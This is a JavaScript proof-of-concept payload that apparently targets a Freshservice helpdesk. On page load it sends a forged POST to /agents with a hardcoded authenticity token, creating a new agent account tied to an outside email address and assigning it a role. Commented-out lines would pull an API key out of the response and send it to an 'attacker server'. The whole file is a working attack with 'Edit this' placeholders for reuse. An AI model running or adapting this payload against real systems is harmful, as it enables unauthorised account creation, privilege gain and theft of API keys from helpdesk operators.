function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function UserAction() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
         if (this.readyState == 4 && this.status == 200) {
             var str = this.responseText;
             alert(str);
            // var domain = "http://localhost/catch.php?api_key="; // Change the Domain based on your use (Edit this)
            // var url=domain+str.split('api_key')[2].substring(2, 22); // Send a request to the attacker server with API Key string (Edit this)
			 httpGet(url)
         }
    };
    var content = `
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="utf8"

✓
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="authenticity_token"

oTXSSFknmQdZqu7hxerNCYHjnIB431jrnNTJftD/MSI67EBvF2VrrpUalCHelDxICmZlPQO4WwCERKhDq1XmYw==
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[occasional]"

false
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[helpdesk_agent]"

true
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[email]"

sathyatesting001@proton.me
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[first_name]"

Sathya
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[last_name]"

Agent
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[job_title]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[phone]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[mobile]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[avatar_attributes][content]"; filename=""
Content-Type: application/octet-stream


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[avatar_attributes][_destroy]"

0
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[image_avatar_data]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[time_zone]"

Eastern Time (US & Canada)
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[language]"

en
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[scoreboard_level_id]"

27000265477
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[time_format]"

12h
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[vip_user]"

0
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[location_id]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[department_users_attributes][department_id]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[department_head]"

0
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[reporting_manager_id]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[address]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[signature_html]"

<p>&nbsp;</p>

-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[user_id]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[description]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="group_agent_type"

on
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[observer_list]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[member_list]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="agent[group_list]"


-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="user[role_ids][]"

[{"name":"27000579335","operator":"0"}]
-----------------------------200502441623432978193750637002
Content-Disposition: form-data; name="redactor_image_field"

"[]"
-----------------------------200502441623432978193750637002--
`;
    xhttp.open("POST", "/agents", true); // Get request the Profile page of the agent (Edit this)
    xhttp.setRequestHeader(`User-Agent`, `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0`);
    xhttp.setRequestHeader(`Accept`, `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8`);
    xhttp.setRequestHeader(`Accept-Language`, `en-US,en;q=0.5`);
    xhttp.setRequestHeader(`Accept-Encoding`, `gzip, deflate`);
    xhttp.setRequestHeader(`Referer`, `https://superstore.freshservice.com/agents/new`);
    // var ct = `multipart/form-data;
    //  boundary=---------------------------34399639671901203802389653615`;
    xhttp.setRequestHeader(`Content-Type`,`multipart/form-data; boundary=---------------------------200502441623432978193750637002`);
    xhttp.setRequestHeader(`Origin`, `https://superstore.freshservice.com`);
    xhttp.setRequestHeader(`Upgrade-Insecure-Requests`, `1`)
    xhttp.setRequestHeader(`Sec-Fetch-Dest`,`document`);
    xhttp.setRequestHeader(`Sec-Fetch-Mode`, `navigate`);
    xhttp.setRequestHeader(`Sec-Fetch-Site`, `same-origin`);
    xhttp.setRequestHeader(`Sec-Fetch-User`, `?1`);
    xhttp.setRequestHeader(`Te`, `trailers`);
    xhttp.setRequestHeader(`Connection`, `close`);
    xhttp.send(content);
    // xhttp.send();
};
UserAction(); // Execute the Function when the JS is loaded
